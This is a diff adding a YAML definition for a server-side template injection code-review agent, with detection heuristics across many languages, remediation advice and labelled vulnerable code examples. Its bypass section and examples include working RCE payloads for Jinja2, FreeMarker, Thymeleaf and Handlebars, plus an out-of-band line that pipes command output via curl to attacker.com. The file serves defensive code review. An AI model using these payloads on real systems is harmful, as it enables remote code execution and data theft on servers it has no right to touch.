@@ -1,0 +1,856 @@
+# domains/injection-input-handling/ssti.yaml
+# Server-Side Template Injection Agent Definition — screw-agents v1.0.0
+# Generated from 4 research files covering Tiers 1-4 of KNOWLEDGE_SOURCES.md, plus Rust cross-cutting research
+# Research date: 2026-04-06
+
+meta:
+  name: ssti
+  display_name: "Server-Side Template Injection Reviewer"
+  domain: injection-input-handling
+  version: "1.0.0"
+  last_updated: "2026-04-06"
+
+  cwes:
+    primary: CWE-1336
+    related:
+      - CWE-94    # Code Injection (parent — Top 25 Rank 10)
+      - CWE-917   # Expression Language Injection (peer — covers SpEL, OGNL, MVEL, EL in JSP)
+
+  capec:
+    - CAPEC-242   # Code Injection (general parent — no SSTI-specific CAPEC exists)
+
+  owasp:
+    top10: "A05:2025 - Injection"
+    asvs:
+      - "1.2.4"   # ASVS v5.0 — parameterized queries, ORMs, or equivalent protection (general injection)
+    testing_guide: "WSTG-INPV-18"
+
+  cwe_top25:
+    parent_rank: 10
+    parent_cwe: CWE-94
+    parent_score: 7.57
+    parent_kevs: 7
+    year: 2025
+    note: "CWE-1336 itself is not ranked (too specific) — falls under CWE-94 (Code Injection)"
+
+  sources:
+    # Tier 1 — Normative Standards
+    - url: "https://cwe.mitre.org/data/definitions/1336.html"
+      last_checked: "2026-04-06"
+    - url: "https://cwe.mitre.org/data/definitions/94.html"
+      last_checked: "2026-04-06"
+    - url: "https://cwe.mitre.org/data/definitions/917.html"
+      last_checked: "2026-04-06"
+    - url: "https://capec.mitre.org/data/definitions/242.html"
+      last_checked: "2026-04-06"
+    - url: "https://owasp.org/Top10/2025/A05_2025-Injection/"
+      last_checked: "2026-04-06"
+    - url: "https://asvs.dev/v5.0.0/V1-Encoding-and-Sanitization/"
+      last_checked: "2026-04-06"
+    # Tier 2 — OWASP Methodology
+    - url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-Side_Template_Injection"
+      last_checked: "2026-04-06"
+    - url: "https://cheatsheetseries.owasp.org/cheatsheets/Template_Injection_Cheat_Sheet.html"
+      last_checked: "2026-04-06"
+    # Tier 3a — SAST Tool Rules
+    - url: "https://semgrep.dev/p/template-injection"
+      last_checked: "2026-04-06"
+    - url: "https://codeql.github.com/codeql-query-help/python/py-template-injection/"
+      last_checked: "2026-04-06"
+    - url: "https://codeql.github.com/codeql-query-help/java/java-server-side-template-injection/"
+      last_checked: "2026-04-06"
+    # Tier 3b — Real-World Intelligence
+    - url: "https://portswigger.net/web-security/server-side-template-injection"
+      last_checked: "2026-04-06"
+    - url: "https://research.checkpoint.com/2024/server-side-template-injection-transforming-web-pages-into-attack-vectors/"
+      last_checked: "2026-04-06"
+      note: "Check Point Research: 1 in 16 orgs impacted weekly by SSTI"
+    - url: "https://arxiv.org/abs/2405.01118"
+      last_checked: "2026-04-06"
+      note: "Academic survey: 31 of 34 engines (91%) allow RCE"
+    # Tier 4 — LLM Security Tools
+    - url: "https://github.com/anthropics/claude-code-security-review"
+      last_checked: "2026-04-06"
+    - url: "https://github.com/Sw4mpf0x/code-review-prompts"
+      last_checked: "2026-04-06"
+    - url: "https://github.com/trailofbits/skills"
+      last_checked: "2026-04-06"
+    # Rust-specific sources
+    - url: "https://docs.rs/tera/latest/tera/"
+      last_checked: "2026-04-06"
+      note: "Tera — Jinja2-compatible template engine for Rust"
+    - url: "https://docs.rs/minijinja/latest/minijinja/"
+      last_checked: "2026-04-06"
+      note: "MiniJinja — minimal Jinja2 engine for Rust"
+    - url: "https://docs.rs/askama/latest/askama/"
+      last_checked: "2026-04-06"
+      note: "Askama — compile-time template engine, structurally immune to SSTI"
+    - url: "https://docs.rs/handlebars/latest/handlebars/"
+      last_checked: "2026-04-06"
+      note: "Handlebars-rust — Handlebars engine for Rust"
+
+core_prompt: |
+  You are a server-side template injection (SSTI) specialist performing security code review.
+  Your goal is to find code paths where attacker-controlled data becomes part of a template
+  SOURCE STRING rather than being passed as template DATA.
+
+  ## The Fundamental Question
+
+  Does user-controlled data become part of a template SOURCE STRING, or is it passed as template
+  DATA?
+
+  This is the single most important distinction in SSTI detection:
+  - VULNERABLE (user-as-template-source): render_template_string("Hello " + user_input)
+  - SAFE (user-as-template-data): render_template("hello.html", name=user_input)
+
+  91% of template engines allow RCE when user input enters the template source (academic survey,
+  2024). The detection question is not "which engine is in use?" but "does user input flow into
+  the template string argument?"
+
+  Answer this through three-phase analysis:
+
+  **Phase 1 — Context Research:** Identify the template engine(s) in use. Determine if templates
+  are loaded from files (safe) or constructed from strings (investigate). Check for sandboxing
+  configuration (Jinja2 SandboxedEnvironment, FreeMarker TemplateClassResolver.ALLOWS_NOTHING,
+  Twig sandbox extension). Identify if compile-time engines are in use (Askama in Rust — structurally
+  immune). Check if logic-less engines are in use (Mustache, Liquid — minimal attack surface).
+
+  **Phase 2 — Data Flow Tracing (Source -> Sink):** Identify all user input entry points (sources).
+  Trace data flow to template rendering points (sinks). The critical question: does user input flow
+  into the TEMPLATE STRING argument, or only into the CONTEXT/DATA argument? Check for string
+  concatenation, f-string interpolation, or format!() bridging user input into template source strings.
+  Distinguish attacker-controlled from server-controlled template content.
+
+  **Phase 3 — Vulnerability Assessment:** Confirm expression evaluation capability — can the engine
+  evaluate arbitrary expressions from user input? Identify the template engine and assess the RCE
+  path: Jinja2 MRO chain to os.popen, FreeMarker ?new() to Execute, Thymeleaf preprocessing to
+  SpEL, Node.js constructor traversal to child_process. Check for sandbox and its bypass potential.
+  Before reporting, restate your precise vulnerability claim — if you cannot articulate it coherently,
+  it is likely a false positive.
+
+  ## Two Injection Contexts
+
+  **Plaintext context:** User input becomes part of the template source.
+  output = render_template_string("Hello " + user_input)
+  If user_input = "{{7*7}}", output = "Hello 49" — expression evaluated.
+
+  **Code context:** User input is placed within an existing template expression.
+  Template: Hello {{greeting}} — if greeting value can break out of the expression context
+  (e.g., "name}}<script>...</script>{{"), this becomes exploitable.
+
+  ## Source Classification
+
+  **Attacker-controlled (investigate):**
+  HTTP request parameters, query strings, POST body, JSON body, HTTP headers (User-Agent, Referer,
+  custom headers), URL path segments, uploaded filenames, file content (CSV, JSON, XML imports),
+  AI/ML user prompts flowing to template rendering (CVE-2024-34359 pattern), CMS/admin user-editable
+  templates (CVE-2025-66438 pattern), dashboard/report template fields (CVE-2024-56085 pattern).
+
+  **Server-controlled (do not flag):**
+  Templates loaded from the filesystem with user data only in context, hardcoded template strings
+  with no user input, compile-time templates (Askama in Rust), auto-escaped template output
+  ({{ var }}) with user data only in context variables.
+
+  ## Sink Identification by Language
+
+  **Python:** render_template_string(var) (Flask/Jinja2); Template(var).render() (Jinja2 direct);
+  Environment().from_string(var).render() (Jinja2); Template(var).render() (Mako);
+  tornado.template.Template(var).generate() (Tornado); django.template.Template(var).render(ctx)
+  (Django — limited, no function calls, but information disclosure possible).
+
+  **Java:** new Template("t", new StringReader(var), cfg).process(...) (FreeMarker — CVE-2022-22954);
+  Velocity.evaluate(ctx, writer, "t", var) (Velocity — CVE-2020-4027);
+  __${var}__ preprocessing in view names (Thymeleaf SpEL — most dangerous);
+  [[${var}]] inline expressions (Thymeleaf); runtime template from user string (Pebble);
+  SpEL evaluation of user input via Spring EL (CVE-2016-4977, CVE-2021-44228 Log4Shell).
+
+  **JavaScript/Node.js:** pug.render(var) / pug.compile(var) (Pug/Jade);
+  ejs.render(var) / ejs.compile(var) (EJS); nunjucks.renderString(var, data) (Nunjucks);
+  Handlebars.compile(var)({}) (Handlebars — prototype traversal in versions < 3.0.7, 4.0.0-4.1.1).
+
+  **PHP:** $twig->createTemplate(var)->render() (Twig — CVE-2020-12790);
+  $smarty->fetch("string:" . var) (Smarty); Blade::render(var) (Blade/Laravel).
+
+  **Ruby:** ERB.new(var).result(binding) (ERB — full code execution via <% %>);
+  Slim::Template.new { var }.render (Slim); Liquid is generally sandboxed — limited risk.
+
+  **Go:** template.New("t").Parse(var).Execute(w, data) (text/template — most dangerous, call
+  function can invoke any public method); html/template with same Parse(var) pattern (auto-escapes
+  HTML but NOT template injection — developers may falsely assume safety).
+
+  **Rust:** tera.render_str(var, &ctx) (Tera — Jinja2-compatible);
+  Tera::one_off(var, &ctx, true) (Tera one-off); env.render_str(var, ctx) (MiniJinja);
+  env.template_from_str(var) (MiniJinja); handlebars.render_template(var, &data) (Handlebars-rust);
+  tera.render_str(&format!("...{var}..."), &ctx) (format!() bridging — the Rust footgun).
+  Askama is STRUCTURALLY IMMUNE — templates compile to Rust code at build time, no runtime parsing.
+  Tera auto-escapes HTML for .html files — this prevents XSS, NOT SSTI.
+
+  **C#/.NET:** Engine.Razor.RunCompile(var, ...) (RazorEngine);
+  Template.Parse(var).Render(ctx) (Scriban).
+
+  ## The String Interpolation Bridge Pattern
+
+  Across all languages, the vulnerability often manifests as string interpolation bridging user
+  input into a template source argument: concatenation ("..." + var), format strings (f"...{var}",
+  String.format(..., var), fmt.Sprintf(..., var)), format!("...{var}...") in Rust. Detect any of
+  these within or flowing into any template render sink listed above.
+
+  ## TP vs FP Criteria
+
+  **True positive signals:** User input flows into the template string argument (not just context/
+  data); string interpolation/concatenation reaches a template render function with attacker-controlled
+  data; CMS/admin interface allows editing template content; AI/ML pipeline passes user prompts
+  through template rendering; render_template_string / from_string / renderString / render_str /
+  one_off / createTemplate / Parse(var) with user-derived argument.
+
+  **False positive signals:** Template loaded from filesystem with user data only in context
+  (render_template("file.html", data=var)); compile-time templates (Askama); logic-less engines
+  (Mustache) with data-only binding; SandboxedEnvironment with user data in context only;
+  auto-escaped output preventing XSS (does NOT prevent SSTI — check template source);
+  test/fixture code with hardcoded template strings; Tera tera.render("file.html", &ctx) where
+  template name is a string literal.
+
+  ## Severity Assessment
+
+  **Critical:** Unauthenticated SSTI on internet-facing endpoint with RCE-capable engine
+  (Jinja2, FreeMarker, Velocity, ERB, EJS, Pug). FreeMarker with ?new() enabled (CVE-2022-22954
+  pattern, CVSS 9.8). Thymeleaf SpEL preprocessing with user-controlled view names.
+  **High:** Authenticated SSTI with RCE path. Jinja2 without SandboxedEnvironment. Node.js
+  template engines with constructor traversal to child_process. Go text/template with dangerous
+  FuncMap entries. Tera/MiniJinja render_str with user input (RCE depends on context objects).
+  **Medium:** SSTI in sandboxed engine (Jinja2 SandboxedEnvironment, Twig sandbox) — sandbox
+  bypasses exist but are version-dependent. Django template injection (information disclosure,
+  limited code execution). Handlebars in strict mode.
+  **Low:** SSTI in admin-only functionality behind strong authentication. Logic-less engines
+  (Mustache, Liquid). Tera/MiniJinja with no dangerous functions registered in context.
+
+  ## SSTI vs XSS Distinction
+
+  SSTI is frequently misdiagnosed as XSS (CWE-79). Key differences: XSS injects client-side
+  script into HTML output; SSTI injects server-side template directives that execute on the server.
+  SSTI is fundamentally more severe — it leads to RCE, not just client-side script execution.
+  Auto-escape (Jinja2 autoescape=True, Go html/template, Tera default for .html) prevents XSS
+  but does NOT prevent SSTI. The fix for XSS (output encoding) does not fix SSTI. SSTI requires
+  preventing user input from reaching the template source.
+
+  ## Emerging Pattern — LLM Pipeline SSTI
+
+  CVE-2024-34359 (llama-cpp-python): user prompts in AI/ML applications flowing to Jinja2
+  template rendering. Flag any LLM/AI pipeline where user input passes through a template engine
+  as an emerging attack vector.
+
+detection_heuristics:
+  high_confidence:
+    # Python
+    - id: py-flask-render-template-string
+      pattern: "render_template_string() with user-controlled argument"
+      languages: [python]
+      example: "render_template_string(f\"Hello {request.args.get('name')}!\")"
+      cves: ["CVE-2024-34359"]
+    - id: py-jinja2-template-var
+      pattern: "Template(var).render() where var is user-controlled"
+      languages: [python]
+      example: "Template(request.form['template']).render()"
+    - id: py-jinja2-from-string-var
+      pattern: "Environment().from_string(var).render() where var is user-controlled"
+      languages: [python]
+      example: "env.from_string(user_input).render(data=data)"
+    - id: py-mako-template-var
+      pattern: "Mako Template(var).render() where var is user-controlled"
+      languages: [python]
+      example: "Template(request.form['content']).render()"
+    - id: py-tornado-template-var
+      pattern: "tornado.template.Template(var).generate() where var is user-controlled"
+      languages: [python]
+      example: "tornado.template.Template(user_input).generate()"
+    - id: py-django-template-var
+      pattern: "django.template.Template(var).render(ctx) where var is user-controlled"
+      languages: [python]
+      example: "django.template.Template(user_input).render(Context({'data': data}))"
+      note: "Django templates are limited (no function calls) but information disclosure is possible"
+    # Java
+    - id: java-freemarker-stringreader
+      pattern: "new Template(name, new StringReader(var), cfg) where var is user-controlled"
+      languages: [java]
+      example: "new Template(\"user\", new StringReader(templateContent), cfg).process(model, out)"
+      cves: ["CVE-2022-22954"]
+    - id: java-velocity-evaluate
+      pattern: "Velocity.evaluate() with user-controlled template string"
+      languages: [java]
+      example: "Velocity.evaluate(ctx, writer, \"tag\", userTemplate)"
+      cves: ["CVE-2020-4027"]
+    - id: java-thymeleaf-preprocess
+      pattern: "__${var}__ preprocessing syntax in Thymeleaf view names or templates with user input"
+      languages: [java]
+      example: "/path?__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::.x"
+    - id: java-thymeleaf-inline
+      pattern: "[[${var}]] inline expression in Thymeleaf with user-controlled variable"
+      languages: [java]
+      example: "[[${userInput}]] in Thymeleaf template"
+    # JavaScript/Node.js
+    - id: js-pug-render-var
+      pattern: "pug.render(var) or pug.compile(var) where var is user-controlled"
+      languages: [javascript, typescript]
+      example: "pug.render(req.body.template)"
+    - id: js-ejs-render-var
+      pattern: "ejs.render(var) or ejs.compile(var) where var is user-controlled"
+      languages: [javascript, typescript]
+      example: "ejs.render(req.query.content, { title: 'Page' })"
+    - id: js-nunjucks-renderstring
+      pattern: "nunjucks.renderString(var, data) where var is user-controlled"
+      languages: [javascript, typescript]
+      example: "nunjucks.renderString(req.body.template, { data: getData() })"
+    - id: js-handlebars-compile-var
+      pattern: "Handlebars.compile(var)({}) where var is user-controlled"
+      languages: [javascript, typescript]
+      example: "Handlebars.compile(req.body.template)({})"
+    # PHP
+    - id: php-twig-createtemplate
+      pattern: "$twig->createTemplate(var)->render() where var is user-controlled"
+      languages: [php]
+      example: "$twig->createTemplate($_POST['template'])->render(['data' => $data])"
+      cves: ["CVE-2020-12790"]
+    - id: php-smarty-string-fetch
+      pattern: "$smarty->fetch(\"string:\" . var) where var is user-controlled"
+      languages: [php]
+      example: "$smarty->fetch(\"string:\" . $_POST['template'])"
+    - id: php-blade-render-var
+      pattern: "Blade::render(var) where var is user-controlled"
+      languages: [php]
+      example: "Blade::render($request->input('template'))"
+    # Ruby
+    - id: rb-erb-new-var
+      pattern: "ERB.new(var).result(binding) where var is user-controlled"
+      languages: [ruby]
+      example: "ERB.new(params[:template]).result(binding)"
+    - id: rb-slim-template-var
+      pattern: "Slim::Template.new { var }.render where var is user-controlled"
+      languages: [ruby]
+      example: "Slim::Template.new { params[:template] }.render"
+    # Go
+    - id: go-template-parse-var
+      pattern: "template.New(name).Parse(var).Execute(w, data) where var is user-controlled"
+      languages: [go]
+      example: "template.New(\"t\").Parse(r.FormValue(\"template\")).Execute(w, data)"
+      note: "html/template auto-escapes HTML but still evaluates template expressions from user input"
+    # Rust
+    - id: rs-tera-render-str
+      pattern: "tera.render_str(var, &ctx) where var is user-controlled"
+      languages: [rust]
+      example: "tera.render_str(&payload.template, &ctx)"
+    - id: rs-tera-one-off-var
+      pattern: "Tera::one_off(var, &ctx, autoescape) where var is user-controlled"
+      languages: [rust]
+      example: "Tera::one_off(&user_template, &ctx, true)"
+    - id: rs-tera-format-bridge
+      pattern: "tera.render_str(&format!(\"...{var}...\"), &ctx) — format!() bridges user input into template"
+      languages: [rust]
+      example: "tera.render_str(&format!(\"Hello {}!\", name), &ctx)"
+    - id: rs-minijinja-render-str
+      pattern: "env.render_str(var, ctx) where var is user-controlled"
+      languages: [rust]
+      example: "env.render_str(&body.template_content, ctx)"
+    - id: rs-minijinja-from-str
+      pattern: "env.template_from_str(var) where var is user-controlled"
+      languages: [rust]
+      example: "env.template_from_str(&user_input)"
+    - id: rs-handlebars-render-template
+      pattern: "handlebars.render_template(var, &data) where var is user-controlled"
+      languages: [rust]
+      example: "handlebars.render_template(&payload.template, &data)"
+    # C#/.NET
+    - id: cs-razor-runcompile
+      pattern: "Engine.Razor.RunCompile(var, ...) where var is user-controlled"
+      languages: [csharp]
+      example: "Engine.Razor.RunCompile(request.TemplateContent, \"key\", null, model)"
+    - id: cs-scriban-parse-var
+      pattern: "Template.Parse(var).Render(ctx) where var is user-controlled"
+      languages: [csharp]
+      example: "Template.Parse(request.TemplateContent).Render(new { data = GetData() })"
+
+  medium_confidence:
+    - id: any-concat-before-render
+      pattern: "Template string built via string concatenation/interpolation with user data before passing to any template render function"
+      languages: [python, java, javascript, typescript, go, ruby, php, csharp, rust]
+      note: "The string interpolation bridge pattern — f-string, +, format(), format!(), fmt.Sprintf() bridging user input to template source."
+    - id: py-jinja2-no-sandbox
+      pattern: "Jinja2 Environment() (not SandboxedEnvironment) processing user-supplied templates"
+      languages: [python]
+      note: "Missing sandbox — SandboxedEnvironment restricts __class__, __mro__ traversal."
+    - id: java-freemarker-new-enabled
+      pattern: "FreeMarker configuration with ?new() built-in enabled (default)"
+      languages: [java]
+      cves: ["CVE-2019-19999"]
+      note: "?new() enables arbitrary class instantiation. Disable via TemplateClassResolver.ALLOWS_NOTHING."
+    - id: java-thymeleaf-view-userinput
+      pattern: "Thymeleaf view name derived from user input (even without explicit __...__ preprocessing)"
+      languages: [java]
+      note: "Thymeleaf may apply preprocessing to view names depending on resolver configuration."
+    - id: any-cms-template-edit
+      pattern: "CMS or admin interface allowing users to edit template content"
+      languages: [python, java, javascript, typescript, php, ruby, csharp]
+      cves: ["CVE-2025-66438", "CVE-2024-56085"]
+      note: "ERPNext, Logpoint SIEM patterns — user-editable template fields."
+    - id: any-llm-template-pipeline
+      pattern: "AI/ML pipeline where user prompts flow through template rendering"
+      languages: [python, javascript, typescript]
+      cves: ["CVE-2024-34359"]
+      note: "llama-cpp-python pattern — user prompts reach Jinja2 rendering."
+    - id: go-funcmap-dangerous
+      pattern: "Go text/template with FuncMap containing os/exec or reflection functions"
+      languages: [go]
+      note: "FuncMap entries expand the template's attack surface significantly."
+    - id: rs-tera-escape-fn
+      pattern: "Tera with set_escape_fn() or heavy use of safe filter"
+      languages: [rust]
+      note: "May indicate developer is fighting the engine's protections — investigate why."
+
+  context_required:
+    - id: any-template-render-variable
+      pattern: "Template render call where the template string argument is a variable — trace origin"
+      languages: [python, java, javascript, typescript, go, ruby, php, csharp, rust]
+      note: "Need to determine if the variable is user-controlled or loaded from trusted source."
+    - id: py-jinja2-sandbox-userinput
+      pattern: "Jinja2 SandboxedEnvironment with user templates — safer but sandbox bypasses exist"
+      languages: [python]
+      note: "Historical bypasses via __class__ traversal. Version-dependent safety."
+    - id: any-django-template-context
+      pattern: "Django templates with user input in context only — limited but information disclosure possible"
+      languages: [python]
+      note: "Django templates cannot call functions, but settings/config objects in context may leak data."
+    - id: any-logicless-engine
+      pattern: "Mustache/Handlebars in strict/logic-less mode with data only — minimal attack surface"
+      languages: [javascript, typescript, ruby]
+    - id: any-liquid-template
+      pattern: "Liquid templates (Ruby) — generally sandboxed, limited risk"
+      languages: [ruby]
+    - id: rs-askama-usage
+      pattern: "Askama (Rust) — structurally immune, compile-time templates"
+      languages: [rust]
+      note: "Should be recognized as definitively safe. No runtime template injection possible."
+    - id: any-autoescape-check
+      pattern: "Auto-escaped output ({{ var }} with autoescape enabled) — prevents XSS but NOT SSTI"
+      languages: [python, go, rust, javascript, typescript]
+      note: "Still need to check if user controls the template SOURCE, not just the data."
+    - id: any-test-fixture-template
+      pattern: "Test/fixture code with hardcoded template strings — not exploitable in production"
+      languages: [python, java, javascript, typescript, go, ruby, php, csharp, rust]
+
+bypass_techniques:
+  - name: "Jinja2 MRO Chain (Introspective Exploitation)"
+    description: "Traverses Python's object hierarchy via __class__, __mro__, __subclasses__(), __globals__ to reach dangerous builtins like os.popen. The most prevalent exploitation category (16 of 34 engines in academic survey)."
+    detection_hint: "Any Jinja2 SSTI with user-as-template-source enables this chain. The shortest RCE payload uses lipsum.__globals__['os'].popen('cmd'). Flask-specific objects (config, request, get_flashed_messages) provide additional entry points."
+    payloads:
+      lipsum: "{{ lipsum.__globals__['os'].popen('id').read() }}"
+      cycler: "{{ cycler.__init__.__globals__.os.popen('id').read() }}"
+      mro_subclass: "{{ ''.__class__.__mro__[1].__subclasses__() }}"
+      flask_config: "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
+    cves: ["CVE-2024-34359", "CVE-2024-56085", "CVE-2025-66438"]
+
+  - name: "FreeMarker ?new() Class Instantiation"
+    description: "The ?new() built-in allows instantiating arbitrary Java classes implementing TemplateModel. freemarker.template.utility.Execute enables direct command execution. Enabled by default — must be explicitly disabled."
+    detection_hint: "Check FreeMarker configuration for TemplateClassResolver. Default config allows ?new() — flag as vulnerable. Versions < 2.3.30 have sandbox bypasses via classLoader traversal."
+    payloads:
+      execute: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+      classloader_bypass: "<#assign cl=article.class.protectionDomain.classLoader><#assign ec=cl.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"id\")}"
+      obfuscation: "${(6?lower_abc+18?lower_abc+...)?new()(9?lower_abc+4?lower_abc)}"
+    cves: ["CVE-2022-22954", "CVE-2019-19999"]
+
+  - name: "Thymeleaf SpEL Preprocessing"
+    description: "Thymeleaf's __${}__ preprocessing syntax evaluates Spring Expression Language before the main template pass. User input in view names or template fragments can trigger arbitrary SpEL evaluation, reaching Runtime.exec()."
+    detection_hint: "Any user input flowing to Thymeleaf view name resolution or template fragment selection. Even without explicit __...__ in code, the resolver may apply preprocessing."
+    payloads:
+      url_injection: "/path?__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
+      inline_expr: "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]"
+
+  - name: "Handlebars Prototype Traversal"
+    description: "In Handlebars versions < 3.0.7 and 4.0.0-4.1.1, complex #with and lookup chains traverse JavaScript prototypes to reach Function constructor, enabling require('child_process').execSync() invocation."
+    detection_hint: "Check Handlebars version in package.json / package-lock.json. Versions >= 4.1.2 mitigate this. Also check Handlebars-rust if it exposes similar traversal."
+    payloads:
+      prototype_chain: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.push (lookup string.sub \"constructor\")}}...{{/with}}{{/with}}{{/with}}"
+
+  - name: "Obfuscation / WAF Bypass"
+    description: "Encoding and manipulation techniques to bypass WAFs and input filters while preserving template expression evaluation."
+    detection_hint: "Relevant for severity assessment — WAFs do not fix root cause. Code review should treat WAF-protected SSTI as still vulnerable."
+    techniques:
+      hex_encoding: "{{ cycler.__init__.__globals__[\"\\x5f\\x5fbuiltins\\x5f\\x5f\"] }}"
+      base64_multistage: "Multi-layer base64 encoding for payload delivery (CVE-2024-28254)"
+      char_concatenation: "Character.toString(105) + Character.toString(100) to construct 'id' in SpEL (CVE-2016-4977)"
+      freemarker_lower_abc: "(6?lower_abc+18?lower_abc+...) to construct class names"
+      django_add_filter: "ih0vr{{364|add:733}}d121r resolves to ih0vr1097d121r"
+    cves: ["CVE-2024-28254", "CVE-2016-4977"]
+
+  - name: "Blind SSTI"
+    description: "When output is not reflected, SSTI can be confirmed and exploited through time-based delays, DNS lookups, or error-based information leakage — analogous to blind SQL injection."
+    detection_hint: "Error-based payloads in Jinja2 use getattr() with concatenated command output. Time-based payloads use sleep or computation loops. OOB uses curl/wget to exfiltrate data via DNS or HTTP."
+    payloads:
+      error_based: "{{ cycler.__init__.__globals__.__builtins__.getattr(\"\", \"x\" + cycler.__init__.__globals__.os.popen('id').read()) }}"
+      oob_dns: "{{ cycler.__init__.__globals__.os.popen('curl http://attacker.com/?data=$(id)').read() }}"
+
+  - name: "Real-World Attack Chain (Cryptojacking)"
+    description: "Observed by Check Point Research (2024): SSTI exploitation chains used for cryptocurrency mining. Recon via fuzz with encoded ping/curl to dnslog.cn, SSTI payload downloads shell script dropper, ELF binary mines Monero via c3pool.org."
+    detection_hint: "Context for severity assessment — SSTI is actively exploited in the wild, not theoretical. 1 in 16 organizations impacted weekly."
+
+remediation:
+  preferred: |
+    Never pass user input as template source. User input must only ever be template DATA,
+    not template SOURCE. Every language and engine provides a safe mechanism:
+
+    Python (Flask): render_template("file.html", data=user_input) — NOT render_template_string()
+    Python (Jinja2): env.get_template("file.html").render(data=user_input) — NOT Template(var) or from_string(var)
+    Python (Mako): Template(filename="file.html").render(data=user_input) — NOT Template(var)
+    Java (FreeMarker): Load templates from classpath/files, disable ?new() via TemplateClassResolver.ALLOWS_NOTHING
+    Java (Velocity): Load templates from files via VelocityEngine — NOT Velocity.evaluate(ctx, w, tag, var)
+    Java (Thymeleaf): Never use __...__ preprocessing with user input; use th:text (escaped) not th:utext
+    JS (EJS): ejs.renderFile("template.ejs", data) — NOT ejs.render(var)
+    JS (Nunjucks): nunjucks.render("template.html", data) — NOT nunjucks.renderString(var, data)
+    JS (Pug): pug.renderFile("template.pug", data) — NOT pug.render(var)
+    JS (Handlebars): Pre-compile templates from files — NOT Handlebars.compile(var)
+    PHP (Twig): $twig->render("template.twig", data) — NOT $twig->createTemplate(var)
+    PHP (Smarty): $smarty->fetch("template.tpl") with assign() — NOT $smarty->fetch("string:" . var)
+    Ruby (ERB): ERB.new(File.read("template.erb")).result(binding) — NOT ERB.new(var)
+    Go: template.ParseFiles("template.html") — NOT template.New("t").Parse(var)
+    Go: Note that html/template prevents XSS but NOT SSTI — both are vulnerable to Parse(var).
+    Rust (Tera): tera.render("template.html", &ctx) — NOT tera.render_str(var, &ctx) or Tera::one_off(var, ...)
+    Rust (MiniJinja): env.get_template("name").render(ctx) — NOT env.render_str(var, ctx)
+    Rust (Handlebars): handlebars.render("registered_name", &data) — NOT handlebars.render_template(var, &data)
+    Rust (Askama): Use Askama — compile-time templates, structurally immune to SSTI.
+    C# (Razor): Use .cshtml files — NOT Engine.Razor.RunCompile(var, ...)
+    C# (Scriban): Pre-compile templates from files; use sandbox mode — NOT Template.Parse(var)
+
+    When user-editable templates are a LEGITIMATE requirement (CMS, report builders, email
+    template editors): use sandboxed engines.
+    Jinja2: SandboxedEnvironment() — restricts __class__, __mro__ traversal
+    FreeMarker: TemplateClassResolver.ALLOWS_NOTHING — disables ?new()
+    Twig: sandbox extension with allowed tags/filters/methods/properties
+    Scriban: sandbox mode restricting accessible types
+    Tera/MiniJinja: NO built-in sandbox — do NOT use with untrusted templates
+
+    If dynamic template features are not required: use compile-time or logic-less engines.
+    Askama (Rust): Compile-time templates — structurally immune
+    Mustache: Logic-less — no code execution by design
+    Handlebars (strict mode): Limited logic (but historical bypasses in older versions)
+    Liquid (Ruby): Sandboxed by default — designed for user-facing templates
+
+  common_mistakes:
+    - mistake: "Assuming auto-escape prevents SSTI"
+      why_insufficient: "Auto-escape (Jinja2 autoescape=True, Go html/template, Tera default for .html) prevents XSS but NOT SSTI. The template engine still evaluates expressions from user input in the template source."
+
+    - mistake: "Using th:utext instead of th:text in Thymeleaf"
+      why_insufficient: "th:utext disables HTML escaping, but even th:text does not prevent SpEL preprocessing injection via __${...}__ syntax."
+
+    - mistake: "Assuming Go html/template is safe"
+      why_insufficient: "html/template auto-escapes HTML output but evaluates template expressions from user input identically to text/template. If user controls the template source (Parse(var)), both are vulnerable."
+
+    - mistake: "Treating SSTI as XSS"
+      why_insufficient: "SSTI is frequently misdiagnosed as XSS (CWE-79). The fix for XSS (output encoding) does not fix SSTI. SSTI requires preventing user input from reaching the template source. SSTI leads to RCE, not just client-side script execution."
+
+    - mistake: "Sandboxing without version awareness"
+      why_insufficient: "FreeMarker sandboxes < 2.3.30 have known bypasses (CVE-2019-19999 classLoader traversal). Jinja2 SandboxedEnvironment has had historical bypasses. Always pin sandbox-critical engine versions."
+
+    - mistake: "Not recognizing Tera as Jinja2-compatible"
+      why_insufficient: "Developers using Tera in Rust may not realize Jinja2-style payloads apply because Tera implements the Jinja2 template syntax. Tera render_str() with user input is equivalent to Jinja2 from_string() with user input."
+
+    - mistake: "Assuming Rust type safety prevents SSTI"
+      why_insufficient: "Rust's type system prevents memory safety issues, not injection logic errors. The format!() macro is the universal Rust footgun — format!() bridging user input (String from web::Query, Path, Json extractors) to template render sinks is fully exploitable."
+
+few_shot_examples:
+  vulnerable:
+    - language: python
+      label: "Flask render_template_string with f-string"
+      code: |
+        @app.route('/greeting')
+        def greeting():
+            name = request.args.get('name')
+            template = f"Hello {name}!"
+            return render_template_string(template)
+      explanation: "User input from request.args becomes the template SOURCE via f-string concatenation into render_template_string(). Attack: name={{lipsum.__globals__['os'].popen('id').read()}}. CVE pattern: CVE-2024-34359. Fix: return render_template('greeting.html', name=name)"
+
+    - language: python
+      label: "Jinja2 from_string with user template"
+      code: |
+        @app.route('/render', methods=['POST'])
+        def render():
+            user_template = request.form.get('template')
+            env = Environment()
+            result = env.from_string(user_template).render(data=get_data())
+            return result
+      explanation: "User input is the ENTIRE template source passed to from_string(). Attack: template={{cycler.__init__.__globals__.os.popen('id').read()}}. Fix: Use SandboxedEnvironment() at minimum; prefer env.get_template('file.html')."
+
+    - language: java
+      label: "FreeMarker with user-controlled template string"
+      code: |
+        @PostMapping("/preview")
+        public String preview(@RequestParam String templateContent, Model model) {
+            Configuration cfg = new Configuration(Configuration.VERSION_2_3_32);
+            Template template = new Template("user", new StringReader(templateContent), cfg);
+            StringWriter out = new StringWriter();
+            template.process(model, out);
+            return out.toString();
+        }
